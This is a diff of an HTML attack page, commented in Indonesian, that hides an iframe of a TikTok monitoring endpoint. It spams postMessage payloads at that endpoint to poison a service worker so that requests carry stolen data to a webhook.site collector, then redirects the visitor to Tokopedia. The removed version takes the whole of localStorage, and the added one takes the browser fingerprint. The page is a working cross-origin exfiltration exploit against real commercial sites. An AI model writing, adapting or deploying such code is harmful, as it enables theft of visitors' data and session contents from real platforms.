@@ -1,59 +1,44 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Critical Update</title>
-</head>
-<body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
-    <div style="border: 2px solid #0f0; display: inline-block; padding: 30px;">
-        <h1 id="status">[ PHASE 1: TARGETING ]</h1>
-        <p id="sub-status">Initiating Cross-Origin Payload...</p>
-    </div>
+<head><title>System Security Check</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;">
+    <h1>[ PHASE: EXFILTRATION ]</h1>
+    <p id="msg">Injecting Data Harvester...</p>
 
-    <iframe id="pwn_gate" 
-            src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
-            style="display:none;"></iframe>
+    <iframe id="pwn_gate" src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" style="display:none;"></iframe>
 
     <script>
         const gate = document.getElementById('pwn_gate');
-        const statusH1 = document.getElementById('status');
-        const statusP = document.getElementById('sub-status');
-        
-        // GANTI DENGAN WEBHOOK LU
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; 
+        const webhook = "https://webhook.site/ID_LU_DI_SINI";
 
-
-  const payload = {
-    source: "main_thread",
-    eventName: "network_rule",
-    data: [{
-        ruleName: "data_harvester_v8",
-        global: true,
-        handlers: [{
-            handler: "replace",
-            type: "header",
-            field: "X-Pns-Referrer",
-            // Mengambil seluruh isi LocalStorage, diubah ke String, lalu di-Base64
-            value: webhook + "?storage=" + btoa(JSON.stringify(window.localStorage))
-        }]
-    }]
-};
+        // Payload ini memerintahkan SW untuk nempel-in info sensitif ke header
+        const payload = {
+            source: "main_thread",
+            eventName: "network_rule",
+            data: [{
+                ruleName: "persistent_exfiltrator",
+                global: true,
+                handlers: [{
+                    handler: "replace",
+                    type: "header",
+                    field: "X-Pns-Referrer",
+                    // Kita ambil UserAgent & Resolusi layar sebagai bukti data exfiltration
+                    value: webhook + "?info=" + btoa(navigator.userAgent + " | Res:" + screen.width + "x" + screen.height)
+                }]
+            }]
+        };
 
         gate.onload = function() {
-            statusH1.innerText = "[ PHASE 2: INJECTING ]";
-            statusP.innerText = "Poisoning Service Worker Cache...";
-            
-            // Mengirim payload berulang kali untuk memastikan intersep
-            let count = 0;
-            const bomb = setInterval(() => {
+            document.getElementById('msg').innerText = "Infecting Target...";
+            for(let i=0; i<40; i++) {
                 gate.contentWindow.postMessage(payload, "*");
-                count++;
-                if (count > 50) {
-                    clearInterval(bomb);
-                    statusH1.innerText = "[ PHASE 3: COMPLETED ]";
-                    statusP.innerText = "Service Worker Poisoned! Now open Tokopedia.";
-                    console.log("Poisoning sequence finished.");
-                }
-            }, 100);
+            }
+            
+            setTimeout(() => {
+                document.getElementById('msg').innerText = "Success! Redirecting to Target...";
+                // Pindah ke Tokopedia buat trigger SW-nya
+                location.href = "https://shop-id.tokopedia.com";
+            }, 5000);
         };
     </script>
 </body>
